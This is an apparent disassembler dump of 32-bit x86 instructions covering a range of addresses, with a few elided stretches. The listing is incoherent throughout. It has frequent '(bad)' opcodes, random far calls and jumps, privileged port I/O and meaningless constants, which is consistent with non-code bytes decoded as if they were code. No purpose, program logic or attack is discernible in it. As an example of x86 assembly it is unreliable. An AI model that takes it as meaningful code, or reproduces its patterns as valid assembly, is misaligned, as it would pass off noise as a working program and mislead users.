  42f2db:	or     BYTE PTR [edx+0x1861dcf6],bl
  42f2e1:	loop   0x42f2b2
  42f2e3:	fild   WORD PTR [esp+edx*1-0x4e8dbd8c]
  42f2ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f2eb:	jle    0x42f2aa
  42f2ed:	dec    esp
  42f2ee:	out    0x7c,eax
  42f2f0:	and    BYTE PTR ds:0xe11ec3d1,ah
  42f2f6:	adc    BYTE PTR [ebx],dh
  42f2f8:	ror    BYTE PTR [ebx+0x622a11fb],cl
  42f2fe:	dec    esp
  42f2ff:	ss jo  0x42f2b8
  42f302:	cmp    dh,BYTE PTR ss:[ebx]
  42f305:	xchg   edi,eax
  42f306:	ins    BYTE PTR es:[edi],dx
  42f307:	call   0x669:0x9ffdc606
  42f30e:	outs   dx,BYTE PTR ds:[esi]
  42f30f:	jns    0x42f376
  42f311:	call   0x2fe2:0x2619bd3a
  42f318:	(bad)  
  42f319:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f31a:	mov    dl,0xb0
  42f31c:	and    al,0x5c
  42f31e:	loopne 0x42f2bf
  42f320:	(bad)  
  42f321:	fcmovnbe st,st(3)
  42f323:	dec    edx
  42f324:	xor    al,0x28
  42f326:	add    DWORD PTR [eax+0x593b3348],edx
  42f32c:	cmp    eax,0xcb541d86
  42f331:	xor    edx,DWORD PTR [edi-0x3fd73992]
  42f337:	cmp    dl,BYTE PTR [ecx+0x4ec0ffcc]
  42f33d:	nop
  42f33e:	aas    
  42f33f:	je     0x42f2fb
  42f341:	push   edi
	...
  42f3b2:	add    BYTE PTR [eax],al
  42f3b4:	loop   0x42f373
  42f3b6:	fadd   st(7),st
  42f3b8:	(bad)  
  42f3ba:	sti    
  42f3bb:	mov    ebp,0xca33a8a7
  42f3c0:	sub    DWORD PTR [esi-0xc6d1b37],esi
  42f3c6:	add    DWORD PTR [eax],eax
  42f3c8:	test   BYTE PTR [eax],0x0
  42f3cb:	add    BYTE PTR [eax+0x79],dh
  42f3ce:	out    dx,al
  42f3cf:	push   edx
  42f3d0:	sbb    al,0x3
  42f3d2:	inc    esp
  42f3d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f3d4:	inc    ecx
  42f3d5:	dec    edi
  42f3d6:	adc    DWORD PTR [eax-0x64],edx
  42f3d9:	out    dx,al
  42f3da:	add    ecx,esp
  42f3dc:	xchg   edi,eax
  42f3dd:	cdq    
  42f3de:	xchg   DWORD PTR es:[edx-0x2b],ebp
  42f3e2:	inc    ecx
  42f3e3:	mov    ds:0x8f21a831,al
  42f3e8:	fcom   DWORD PTR [eax+edi*1+0x228ead5f]
  42f3ef:	lods   al,BYTE PTR ds:[esi]
  42f3f0:	dec    BYTE PTR [ecx+ecx*1]
  42f3f3:	sti    
  42f3f4:	dec    edi
  42f3f5:	pop    es
  42f3f6:	shl    BYTE PTR [ecx],0x78
  42f3f9:	adc    esp,DWORD PTR [esi+edi*8]
  42f3fc:	bound  eax,QWORD PTR ds:0x607e874a
  42f402:	mov    ds:0xfc413c24,al
  42f407:	std    
  42f408:	mov    esp,DWORD PTR [edx-0xea0d12e]
  42f40e:	out    0x4d,eax
  42f410:	add    ebp,DWORD PTR [edi+0x7]
  42f413:	fst    DWORD PTR [edx-0x41]
  42f416:	push   ebx
  42f417:	xor    eax,0x3b2cea6b
  42f41c:	pop    es
  42f41d:	dec    edi
  42f41e:	into   
  42f41f:	fs enter 0x5a72,0x91
  42f424:	inc    ecx
  42f425:	ror    BYTE PTR [ebx-0x6c],cl
  42f428:	jno    0x42f3b9
  42f42a:	sub    cl,BYTE PTR [ebx+0x784802d]
  42f430:	outs   dx,DWORD PTR ds:[esi]
  42f431:	sub    eax,0x3f96a49f
  42f436:	cmp    dl,BYTE PTR [edi-0x2915d45]
  42f43c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f43d:	xor    eax,DWORD PTR [eax+0x61300b83]
  42f443:	push   ds
  42f444:	daa    
  42f445:	add    eax,0xcc47cd9a
  42f44a:	and    ecx,edi
  42f44c:	push   0x44
  42f44e:	push   esp
  42f44f:	fs addr16 icebp 
  42f452:	dec    ebp
  42f453:	cmp    ecx,DWORD PTR [esi]
  42f455:	popf   
  42f456:	sbb    ebx,DWORD PTR [ecx]
  42f458:	les    esp,FWORD PTR [ebp+0x66f50042]
  42f45e:	jg     0x42f456
  42f460:	inc    edx
  42f461:	adc    DWORD PTR [edx-0x34],edi
  42f464:	inc    ecx
  42f465:	xchg   ecx,eax
  42f466:	push   es
  42f467:	pushf  
  42f468:	dec    ebx
  42f469:	pop    ds
  42f46a:	push   esp
  42f46b:	pop    ecx
  42f46c:	mov    esp,0x6c511933
  42f471:	in     al,0x8
  42f473:	xchg   esi,eax
  42f474:	mov    ds:0x91816f8e,al
  42f479:	xchg   edx,esi
  42f47b:	cmc    
  42f47c:	test   BYTE PTR [esi-0x6],al
  42f47f:	fs xchg esp,eax
  42f481:	gs rol dl,1
  42f484:	in     al,dx
  42f485:	xchg   ebp,eax
  42f486:	pop    esi
  42f487:	pop    edx
  42f488:	mov    eax,ds:0x6f5e5494
  42f48d:	or     al,0x39
  42f48f:	aam    0xe6
  42f491:	idiv   DWORD PTR [ecx]
  42f493:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f495:	sti    
  42f496:	jle    0x42f466
  42f498:	mov    ebp,0x9c08aa33
  42f49d:	jno    0x42f51d
  42f49f:	inc    esp
  42f4a0:	pop    eax
  42f4a1:	scas   eax,DWORD PTR es:[edi]
  42f4a2:	(bad)  
  42f4a3:	push   0x1a7e855
  42f4a8:	ja     0x42f462
  42f4aa:	mov    dl,0x43
  42f4ac:	(bad)  
  42f4ae:	repnz push eax
  42f4b0:	xchg   ecx,eax
  42f4b1:	jb     0x42f505
  42f4b3:	js     0x42f4e2
  42f4b5:	out    0xc6,eax
  42f4b7:	fadd   DWORD PTR [edx]
  42f4b9:	sbb    DWORD PTR [ebx+0x5e146e0f],0x1f10f0
	...
  42f533:	add    BYTE PTR [ebp+0x38],dl
  42f536:	into   
  42f537:	adc    bh,ch
  42f539:	neg    bh
  42f53b:	jge    0x42f546
  42f53d:	push   cs
  42f53e:	xchg   BYTE PTR [edi-0x16],bh
  42f541:	dec    esp
  42f542:	mov    esi,0x1f48804
  42f547:	add    dh,dh
  42f549:	add    BYTE PTR [eax],al
  42f54b:	add    BYTE PTR [ebx],dh
  42f54d:	jne    0x42f578
  42f54f:	iret   
  42f550:	mov    dl,0xd1
  42f552:	mul    BYTE PTR [ecx-0x6c]
  42f555:	scas   eax,DWORD PTR es:[edi]
  42f556:	inc    eax
  42f557:	mov    ds:0x53ff6917,al
  42f55c:	ds xchg ebp,eax
  42f55e:	lds    edi,FWORD PTR [eax+edx*8-0xe]
  42f562:	jb     0x42f506
  42f564:	aas    
  42f565:	rcl    DWORD PTR ds:0x8ac2243,1
  42f56b:	repz add ebx,eax
  42f56e:	mov    al,0x1b
  42f570:	push   cs
  42f571:	pop    edx
  42f572:	inc    edi
  42f573:	and    edi,DWORD PTR [ecx+0x53b0bfe2]
  42f579:	das    
  42f57a:	inc    edx
  42f57b:	(bad)  [eax-0xca4fe5c]
  42f581:	addr16 repz (bad) 
  42f584:	adc    BYTE PTR [edi-0x1a],0x6c
  42f588:	aas    
  42f589:	pop    edi
  42f58a:	outs   dx,BYTE PTR ds:[esi]
  42f58b:	ss cmp edi,esp
  42f58e:	sub    esp,DWORD PTR ds:0xa3dd97f4
  42f594:	test   al,0x64
  42f596:	mov    BYTE PTR ds:0x9ed1b6ed,dl
  42f59c:	jne    0x42f56c
  42f59e:	inc    esp
  42f59f:	or     eax,ebx
  42f5a1:	ins    BYTE PTR es:[edi],dx
  42f5a2:	pop    esp
  42f5a3:	add    eax,0xbe168ede
  42f5a8:	popa   
  42f5a9:	adc    esi,DWORD PTR [ebx+0x31068f45]
  42f5af:	les    eax,FWORD PTR [ebx]
  42f5b1:	adc    DWORD PTR [edi-0xad06314],0xffffffa7
  42f5b8:	xor    esi,DWORD PTR [ecx+ebp*8]
  42f5bb:	mov    bl,0xb8
  42f5bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f5be:	cmc    
  42f5bf:	mov    BYTE PTR [ebp+0x4e01c59a],0xc7
  42f5c6:	loop   0x42f640
  42f5c8:	mov    bh,BYTE PTR [ecx+0x73bb4f7e]
  42f5ce:	fwait
  42f5cf:	push   esi
  42f5d0:	sub    ebx,ecx
  42f5d2:	push   eax
  42f5d3:	jmp    0x42f5f7
  42f5d5:	test   eax,0x368c49ff
  42f5da:	xor    al,0xc9
  42f5dc:	sub    al,0x19
  42f5de:	mov    esi,0x53832e21
  42f5e3:	out    0x4c,al
  42f5e5:	xchg   ebp,eax
  42f5e6:	add    DWORD PTR [eax],edi
  42f5e8:	push   edi
  42f5e9:	fwait
  42f5ea:	mov    ecx,0x399ca2b3
  42f5ef:	(bad)  
  42f5f0:	popf   
  42f5f1:	repnz adc esp,ebx
  42f5f4:	jmp    0xca2ba35c
  42f5f9:	lds    ebp,FWORD PTR [edi+0x65]
  42f5fc:	mov    al,ds:0x5878592b
  42f601:	or     DWORD PTR [esi+esi*1],edx
  42f604:	mov    gs,WORD PTR [ebp-0x499543c8]
  42f60a:	mov    ebx,0xf15b07d4
  42f60f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f610:	push   0xebf8b53f
  42f615:	jg     0x42f647
  42f617:	int3   
  42f618:	push   0x9bfe4dba
  42f61d:	gs gs mov al,0xcf
  42f621:	xor    bl,BYTE PTR [edi+0x54]
  42f624:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f625:	adc    ah,BYTE PTR [esi+0x6b8261e7]
  42f62b:	sahf   
  42f62c:	push   edx
  42f62d:	fld    QWORD PTR [edi]
  42f62f:	mov    al,0x92
  42f631:	scas   eax,DWORD PTR es:[edi]
  42f632:	cmp    BYTE PTR [esi+0x70],dl
  42f635:	std    
  42f636:	(bad)  
  42f637:	mov    al,0xcf
  42f639:	sub    ebx,DWORD PTR [edx]
  42f63b:	mov    esp,0x5366536e
  42f640:	daa    
  42f641:	add    BYTE PTR [eax],0x0
	...
  42f6b4:	pop    edx
  42f6b5:	cmp    DWORD PTR [esi+0x2d],ecx
  42f6b8:	outs   dx,DWORD PTR ds:[esi]
  42f6b9:	jg     0x42f736
  42f6bb:	jg     0x42f6c6
  42f6bd:	mov    bh,0xe3
  42f6bf:	xor    bh,BYTE PTR [esi+0x7e6d49c8]
  42f6c5:	cmc    
  42f6c6:	add    DWORD PTR [eax],eax
  42f6c8:	test   BYTE PTR [eax],0x0
  42f6cb:	add    bl,cl
  42f6cd:	sbb    ecx,DWORD PTR [esi]
  42f6cf:	repnz shl DWORD PTR gs:[esi],0x99
  42f6d4:	mov    esp,0xd9d1a00e
  42f6d9:	jge    0x42f730
  42f6db:	add    DWORD PTR [edi+0x8],edx
  42f6de:	mov    bh,0xe9
  42f6e0:	mov    BYTE PTR [edx-0x329f343e],ah
  42f6e6:	dec    ecx
  42f6e7:	push   ecx
  42f6e8:	adc    edx,ebx
  42f6ea:	add    al,BYTE PTR [ebx]
  42f6ec:	xor    esp,DWORD PTR [eax]
  42f6ee:	aaa    
  42f6ef:	jo     0x42f748
  42f6f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f6f2:	cmc    
  42f6f3:	or     ch,BYTE PTR [ebp-0x50bcdea1]
  42f6f9:	cs jp  0x42f713
  42f6fc:	sti    
  42f6fd:	mov    es,WORD PTR [esi+0x5206f348]
  42f703:	call   0xeb69:0x45d9b10d
  42f70a:	xchg   esp,eax
  42f70b:	xchg   edi,eax
  42f70c:	repnz or DWORD PTR [eax],edi
  42f70f:	iret   
  42f710:	or     al,0xe0
  42f712:	pop    esp
  42f713:	es cdq 
  42f715:	cmp    edx,DWORD PTR [eax-0x22]
  42f718:	jl     0x42f726
  42f71a:	mov    ds:0x930abe8a,al
  42f71f:	mov    ?,WORD PTR [edi-0x1]
  42f722:	loop   0x42f71b
  42f724:	inc    eax
  42f725:	popf   
  42f726:	stos   BYTE PTR es:[edi],al
  42f727:	retf   
  42f728:	cmp    dl,al
  42f72a:	xor    al,0x97
  42f72c:	inc    edx
  42f72d:	lds    ebp,FWORD PTR [edx]
  42f72f:	les    ebp,FWORD PTR [esi]
  42f731:	fs jp  0x42f780
  42f734:	mov    ss,edx
  42f736:	sub    eax,0x8ca22bb4
  42f73b:	sub    DWORD PTR [ecx+0x1f659288],edi
  42f741:	fstp   QWORD PTR [edi]
  42f743:	add    al,0x44
  42f745:	sbb    esp,DWORD PTR [ebp-0x4db4ac50]
  42f74b:	cmp    ah,ch
  42f74d:	das    
  42f74e:	pop    edi
  42f74f:	pop    eax
  42f750:	lahf   
  42f751:	and    ax,WORD PTR [ecx]
  42f754:	stos   BYTE PTR es:[edi],al
  42f755:	mov    ah,BYTE PTR [edi]
  42f757:	fcom   QWORD PTR [eax+0x7c92551]
  42f75d:	inc    esi
  42f75e:	xor    BYTE PTR [edx],dh
  42f760:	ja     0x42f75c
  42f762:	add    bh,ch
  42f764:	fist   DWORD PTR [edi+ebp*8-0x57]
  42f768:	push   0xffffffb9
  42f76a:	cdq    
  42f76b:	xchg   DWORD PTR [edi-0xdbd586f],esi
  42f771:	pop    esp
  42f772:	mov    ds:0xc96b9d68,eax
  42f777:	add    BYTE PTR [ebx+0x74],ah
  42f77a:	je     0x42f767
  42f77c:	iret   
  42f77d:	lods   eax,DWORD PTR ds:[esi]
  42f77e:	jb     0x42f7d5
  42f780:	stos   DWORD PTR es:[edi],eax
  42f781:	(bad)  
  42f782:	pushf  
  42f783:	jl     0x42f7e7
  42f785:	scas   eax,DWORD PTR es:[edi]
  42f786:	imul   esp,DWORD PTR [edi+0x32],0x6c
  42f78a:	test   DWORD PTR [esi+0x5],ebp
  42f78d:	scas   al,BYTE PTR es:[edi]
  42f78e:	push   cs
  42f78f:	mov    eax,0xac013eed
  42f794:	int    0xdd
  42f796:	inc    esp
  42f797:	(bad)  
  42f799:	and    BYTE PTR [ebx+ebp*2],ch
  42f79c:	jbe    0x42f740
  42f79e:	push   ebx
  42f79f:	(bad)  
  42f7a0:	rcr    BYTE PTR [esi],cl
  42f7a2:	dec    edx
  42f7a3:	or     eax,0x3a026630
  42f7a8:	cmp    ah,BYTE PTR [edx+0x3d5444e2]
  42f7ae:	out    dx,al
  42f7af:	jg     0x42f81d
  42f7b1:	gs sub dh,ch
  42f7b4:	and    edx,DWORD PTR [ecx+edx*8]
  42f7b7:	push   esp
  42f7b8:	xchg   BYTE PTR [esi],bh
  42f7ba:	shr    al,1
  42f7bc:	(bad)  
  42f7bd:	push   es
  42f7be:	push   cs
  42f7bf:	(bad)  
  42f7c0:	mul    BYTE PTR [eax+eax*1]
	...
  42f833:	add    bl,al
  42f835:	ja     0x42f897
  42f837:	and    al,0xf4
  42f839:	aaa    
  42f83a:	(bad)  
  42f83b:	neg    DWORD PTR [edi-0x71af3771]
  42f841:	mov    ch,0x5c
  42f843:	loopne 0x42f8b9
  42f845:	test   BYTE PTR [ecx],0x0
  42f848:	test   BYTE PTR [eax],0x0
  42f84b:	add    BYTE PTR [ecx],dl
  42f84d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f84e:	jno    0x42f827
  42f850:	adc    al,0x69
  42f852:	dec    edi
  42f853:	das    
  42f854:	lods   eax,DWORD PTR ds:[esi]
  42f855:	arpl   WORD PTR [edi-0x50575556],bx
  42f85b:	dec    ebp
  42f85c:	lods   al,BYTE PTR ds:[esi]
  42f85d:	bound  esp,QWORD PTR [edx-0x68]
  42f860:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f861:	repz je 0x42f8d3
  42f864:	adc    dh,ch
  42f866:	and    al,0x3b
  42f868:	xor    bh,BYTE PTR [eax+0x124398d1]
  42f86e:	stos   BYTE PTR es:[edi],al
  42f86f:	jno    0x42f8ef
  42f871:	dec    BYTE PTR [ebx-0x6b]
  42f874:	fwait
  42f875:	mov    bl,0x7e
  42f877:	sar    BYTE PTR [edi],cl
  42f879:	je     0x42f87d
  42f87b:	std    
  42f87c:	jb     0x42f86e
  42f87e:	add    BYTE PTR [ebx-0x75],0xb0
  42f882:	sub    eax,0x7d0410f
  42f887:	add    al,0xba
  42f889:	xor    eax,0x9e665a24
  42f88e:	int    0x39
  42f890:	std    
  42f891:	enter  0x6360,0x25
  42f895:	ficom  DWORD PTR [eax]
  42f897:	mov    ah,0x24
  42f89a:	repnz out 0x8,al
  42f89d:	das    
  42f89e:	stos   DWORD PTR es:[edi],eax
  42f89f:	icebp  
  42f8a0:	nop
  42f8a1:	mov    WORD PTR ds:0xe32d6733,ss
  42f8a7:	and    al,0x7e
  42f8a9:	mov    eax,ds:0x91d6aaa4
  42f8ae:	jmp    0xafbe:0x88b15bb8
  42f8b5:	mov    al,ds:0xac5974c3
  42f8ba:	addr16 lahf 
  42f8bc:	dec    esi
  42f8bd:	jge    0x42f91e
  42f8bf:	cmp    BYTE PTR [eax],ah
  42f8c1:	mov    ds:0x15209a5c,al
  42f8c6:	shl    al,cl
  42f8c8:	add    eax,0xfc448456
  42f8cd:	inc    ecx
  42f8ce:	scas   eax,DWORD PTR es:[edi]
  42f8cf:	sbb    al,0x33
  42f8d1:	es jge 0x42f939
  42f8d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f8d5:	xchg   DWORD PTR ds:0x7f7b6ba8,ecx
  42f8db:	lods   eax,DWORD PTR ds:[esi]
  42f8dc:	jo     0x42f925
  42f8de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f8df:	outs   dx,DWORD PTR ds:[esi]
  42f8e0:	jbe    0x42f90d
  42f8e2:	ds inc esp
  42f8e4:	dec    ecx
  42f8e5:	lods   eax,DWORD PTR ds:[esi]
  42f8e6:	or     eax,0x9e6a357e
  42f8eb:	push   ecx
  42f8ec:	cwde   
  42f8ed:	mov    ebx,0x3dac4a43
  42f8f2:	xchg   ebx,eax
  42f8f3:	test   ch,dl
  42f8f5:	push   cs
  42f8f6:	fiadd  WORD PTR [ebx+0x75e28d28]
  42f8fc:	mov    cl,0x72
  42f8fe:	sub    eax,0xedcd7505
  42f903:	push   esp
  42f905:	mov    eax,ds:0x27c30d3c
  42f90a:	hlt    
  42f90b:	call   0xffb3:0x7d3c28d8
  42f912:	cli    
  42f913:	outs   dx,BYTE PTR ds:[esi]
  42f914:	cs js  0x42f986
  42f917:	shl    BYTE PTR ds:0xeeb093e7,0x9d
  42f91e:	scas   al,BYTE PTR es:[edi]
  42f91f:	repz push ebp
  42f921:	enter  0x13ba,0xc6
  42f925:	fdivr  QWORD PTR [edx]
  42f927:	xor    BYTE PTR [esp+edi*1-0x67b38322],0xba
  42f92f:	inc    ecx
  42f930:	je     0x42f94d
  42f932:	push   eax
  42f933:	jnp    0x42f8df
  42f935:	aas    
  42f936:	std    
  42f937:	lea    ebp,[ecx-0x4f52ec80]
  42f93d:	xchg   esp,eax
  42f93e:	loop   0x42f941
  42f940:	dec    ebp
  42f941:	add    BYTE PTR fs:[eax],al
	...
  42f9b4:	in     eax,0xba
  42f9b6:	xchg   edx,eax
  42f9b7:	jecxz  0x42f998
  42f9b9:	jmp    0x42f9b0
  42f9bb:	mov    esi,0x4d34a307
  42f9c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f9c1:	xchg   dl,bl
  42f9c3:	jp     0x42fa2f
  42f9c5:	test   DWORD PTR [ecx],0xf600
  42f9cb:	add    BYTE PTR [ecx+edx*8-0x7e],bl
  42f9cf:	sbb    esp,DWORD PTR [ebp+0xe]
  42f9d2:	pop    edi
  42f9d3:	jno    0x42fa36
  42f9d5:	hlt    
  42f9d6:	stc    
  42f9d7:	data16 sti 
  42f9d9:	leave  
  42f9da:	mov    dh,0x7e
  42f9dc:	xor    cl,BYTE PTR [eax]
  42f9de:	outs   dx,DWORD PTR ds:[esi]
  42f9df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f9e0:	cmp    ecx,esi
  42f9e2:	inc    ebx
  42f9e3:	push   es
  42f9e4:	pop    ebx
  42f9e5:	ins    DWORD PTR es:[edi],dx
  42f9e6:	cli    
  42f9e7:	retf   0xbee7
  42f9ea:	xchg   edi,eax
  42f9eb:	cmc    
  42f9ec:	jbe    0x42fa5c
  42f9ee:	mov    eax,0xe6a79d24
  42f9f3:	xchg   edi,eax
  42f9f4:	lods   eax,DWORD PTR ds:[esi]
  42f9f5:	mov    DWORD PTR [edx-0x116ec6c2],esi
  42f9fb:	clc    
  42f9fc:	les    esi,FWORD PTR [ebx+0x2b339c9b]
  42fa02:	ss adc eax,0x37719a61
  42fa08:	lods   eax,DWORD PTR ds:[esi]
  42fa09:	stos   BYTE PTR es:[edi],al
  42fa0a:	jecxz  0x42f9a0
  42fa0c:	pop    edi
  42fa0d:	ficom  WORD PTR gs:[edi+0x3d]
  42fa11:	sub    bh,bl
  42fa13:	imul   esp,DWORD PTR [edx-0x10eaebdf],0x72a3379f
  42fa1d:	aam    0xbd
  42fa1f:	jno    0x42fa4e
  42fa21:	mov    ah,0x59
  42fa23:	out    0xf7,eax
  42fa25:	mov    esp,0xa575b1c8
  42fa2a:	icebp  
  42fa2b:	stos   BYTE PTR es:[edi],al
  42fa2c:	xchg   ebx,eax
  42fa2d:	jg     0x42fa2b
  42fa2f:	repz mov ebp,0x20306975
  42fa35:	adc    dl,BYTE PTR [ebx+0x13231c1d]
  42fa3b:	add    BYTE PTR [ebx],ch
  42fa3d:	xor    eax,0x17ef2a9
  42fa42:	or     esi,DWORD PTR [edi+0x6fa1fe94]
  42fa48:	out    0xd9,al
  42fa4a:	aam    0xdc
  42fa4c:	jmp    0x42fa6b
  42fa4e:	cmc    
  42fa4f:	jecxz  0x42fa5d
  42fa51:	aaa    
  42fa52:	pop    eax
  42fa53:	mov    eax,ds:0x6eb49755
  42fa58:	ins    DWORD PTR es:[edi],dx
  42fa59:	xchg   esi,eax
  42fa5a:	aaa    
  42fa5b:	mov    ch,0x71
  42fa5d:	popf   
  42fa5e:	or     ch,ah
  42fa60:	inc    ecx
  42fa61:	jno    0x42fa82
  42fa63:	xchg   edx,eax
  42fa64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fa65:	xchg   ecx,eax
  42fa66:	pop    edi
  42fa67:	pop    esi
  42fa68:	add    BYTE PTR [edi+0x69],0xdd
  42fa6c:	sbb    DWORD PTR [edi],edx
  42fa6e:	adc    DWORD PTR [ebx],esp
  42fa70:	in     al,dx
  42fa71:	fadd   QWORD PTR [edx-0xa30ab66]
  42fa77:	mov    cs,WORD PTR [esp+ebx*2+0x34c5e3d2]
  42fa7e:	or     cl,dl
  42fa80:	or     BYTE PTR [ebx-0x9],bh
  42fa83:	and    esi,DWORD PTR [edi]
  42fa85:	ret    
  42fa86:	loope  0x42fa53
  42fa88:	aaa    
  42fa89:	xlat   BYTE PTR ds:[ebx]
  42fa8a:	retf   0xb1af
  42fa8d:	ret    
  42fa8e:	mov    ebp,0x8574b6c9
  42fa93:	rcr    BYTE PTR [eax-0x65067076],cl
  42fa99:	pop    esp
  42fa9a:	call   0x476d:0x759341b5
  42faa1:	xlat   BYTE PTR ds:[ebx]
  42faa2:	aaa    
  42faa3:	xchg   edi,eax
  42faa4:	dec    ebx
  42faa5:	shr    BYTE PTR [eax],cl
  42faa7:	jmp    0x42fb13
  42faa9:	sub    bl,ah
  42faab:	mov    ecx,0xbaed1525
  42fab0:	push   cs
  42fab1:	add    eax,0x8c26f2c6
  42fab6:	or     eax,0x7a05412c
  42fabb:	adc    al,0x23
  42fabd:	gs int 0x95
  42fac0:	sbb    ebx,DWORD PTR [esi]
	...
  42fb32:	add    BYTE PTR [eax],al
  42fb34:	jle    0x42fb77
  42fb36:	jne    0xfc41ca7b
  42fb3c:	cmp    DWORD PTR [ebx+0x4a],ebp
  42fb3f:	pop    es
  42fb40:	sbb    al,0x82
  42fb42:	(bad)  
  42fb43:	xchg   DWORD PTR [eax-0x8],esp
  42fb46:	add    DWORD PTR [eax],eax
  42fb48:	test   BYTE PTR [eax],0x0
  42fb4b:	add    BYTE PTR [ecx-0x270a690a],bl
  42fb51:	xchg   BYTE PTR [esi+0x47fcb047],dh
  42fb57:	nop
  42fb58:	mov    eax,0xef21d8ee
  42fb5d:	ds das 
  42fb5f:	jge    0x42fb50
  42fb61:	das    
  42fb62:	das    
  42fb63:	mov    edx,DWORD PTR [ecx]
  42fb65:	lods   eax,DWORD PTR ds:[esi]
  42fb66:	cmp    ebx,DWORD PTR [eax+0x76]
  42fb69:	shl    DWORD PTR [esi],1
  42fb6b:	pop    edi
  42fb6c:	jo     0x42fb6f
  42fb6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fb6f:	(bad)  
  42fb70:	mov    eax,0x52d2c643
  42fb75:	inc    ebx
  42fb76:	stos   DWORD PTR es:[edi],eax
  42fb77:	push   0xa14e2c54
  42fb7c:	out    dx,al
  42fb7d:	jecxz  0x42fb0b
  42fb7f:	fnstsw WORD PTR [edx-0x55bbb2e0]
  42fb85:	les    edi,FWORD PTR [edi+0x72]
  42fb88:	cli    
  42fb89:	lods   al,BYTE PTR ds:[esi]
  42fb8a:	mov    ebx,0x2e8632f6
  42fb8f:	pop    es
  42fb90:	or     BYTE PTR ds:0xa1074d3b,0x85
  42fb97:	push   es
  42fb98:	fbstp  TBYTE PTR [ebx+0x16]
  42fb9b:	jg     0x42fba6
  42fb9d:	add    eax,DWORD PTR cs:[ecx*2+0x4b9c8974]
  42fba5:	int3   
  42fba6:	mov    dl,0x5
  42fba8:	dec    eax
  42fba9:	lds    esi,FWORD PTR [edx-0xdf9b391]
  42fbaf:	push   0xfffffffe
  42fbb1:	inc    ebp
  42fbb2:	sahf   
  42fbb3:	sbb    BYTE PTR [edx],cl
  42fbb5:	mov    esp,DWORD PTR [edx]
  42fbb7:	aaa    
  42fbb8:	push   ebx
  42fbb9:	retf   
  42fbba:	jo     0x42fbce
  42fbbc:	pop    edx
  42fbbd:	icebp  
  42fbbe:	jecxz  0x42fc24
  42fbc0:	inc    edi
  42fbc1:	ror    DWORD PTR ds:0xe247afd2,cl
  42fbc7:	fstp   QWORD PTR [ebx]
  42fbc9:	adc    eax,0xb30c8b45
  42fbce:	arpl   bx,dx
  42fbd0:	or     BYTE PTR [ecx],cl
  42fbd2:	sbb    edx,DWORD PTR [edi-0x3f92e7ed]
  42fbd8:	xchg   ebp,eax
  42fbd9:	out    dx,al
  42fbda:	pop    ds
  42fbdb:	lds    esi,FWORD PTR [ebx]
  42fbdd:	xor    al,0x1f
  42fbdf:	std    
  42fbe0:	sub    dl,BYTE PTR [eax]
  42fbe2:	je     0x42fc26
  42fbe4:	int    0xb4
  42fbe6:	pop    eax
  42fbe7:	fwait
  42fbe8:	pop    ebx
  42fbe9:	jmp    0x42fc2f
  42fbeb:	sub    ebp,DWORD PTR [edi]
  42fbed:	push   esp
  42fbee:	pusha  
  42fbef:	rol    DWORD PTR [ebx],1
  42fbf1:	mov    esi,0xbc3086dc
  42fbf6:	add    al,0xb7
  42fbf8:	in     al,0x4
  42fbfa:	or     ebx,DWORD PTR [edi-0x7334bbc7]
  42fc00:	fs data16 gs int 0x65
  42fc05:	and    al,0x17
  42fc07:	adc    al,0x3a
  42fc09:	jmp    0x9e0c8f54
  42fc0e:	or     ebp,DWORD PTR [edx-0x1fc776f1]
  42fc14:	jae    0x42fc02
  42fc16:	lds    ebx,FWORD PTR [ecx-0x7b]
  42fc19:	sub    BYTE PTR [edx],bh
  42fc1b:	and    eax,esi
  42fc1d:	nop
  42fc1e:	mov    edi,0x7102ad0b
  42fc23:	pcmpeqb mm3,QWORD PTR ds:0x5ae570e5
  42fc2a:	and    edi,DWORD PTR [eax+0xf]
  42fc2d:	jo     0x42fc72
  42fc2f:	dec    edx
  42fc30:	or     DWORD PTR [eax-0x9ce96d8],ebx
  42fc36:	outs   dx,BYTE PTR ds:[esi]
  42fc37:	or     eax,0xfc69eda2
  42fc3c:	ret    
  42fc3d:	arpl   WORD PTR es:[ecx+0xd0bf],sp
	...
  42fcb4:	sub    dh,dh
  42fcb6:	scas   eax,DWORD PTR es:[edi]
  42fcb7:	fdivr  st,st(7)
  42fcb9:	fnstcw WORD PTR [edi-0xa]
  42fcbc:	cmp    DWORD PTR [esp+ebx*2],0xb46b67b9
  42fcc3:	add    eax,0x1f956
  42fcc8:	test   BYTE PTR [eax],0x0
  42fccb:	add    BYTE PTR ds:0x1fe33400,ch
  42fcd1:	xchg   esi,eax
  42fcd2:	repz sbb bh,0x9d
  42fcd6:	rcl    ebp,1
  42fcd8:	ja     0x42fd2b
  42fcda:	das    
  42fcdb:	dec    edi
  42fcdc:	icebp  
  42fcdd:	out    0x43,al
  42fcdf:	mov    esi,0x3f895476
  42fce4:	outs   dx,BYTE PTR ds:[esi]
  42fce5:	loope  0x42fcc3
  42fce7:	js     0x42fcc8
  42fce9:	push   edi
  42fcea:	test   al,0xc3
  42fcec:	xchg   ecx,eax
  42fced:	sbb    al,0xc3
  42fcef:	and    al,0x56
  42fcf1:	setge  BYTE PTR [eax]
  42fcf4:	enter  0xccde,0x33
  42fcf8:	push   ss
  42fcf9:	outs   dx,DWORD PTR ds:[esi]
  42fcfa:	lods   eax,DWORD PTR ds:[esi]
  42fcfb:	pop    ecx
  42fcfc:	mov    ah,0x81
  42fcfe:	sbb    edi,DWORD PTR [ecx-0x69]
  42fd01:	xor    al,0x9f
  42fd03:	inc    ebx
  42fd04:	test   eax,0xdd470fa4
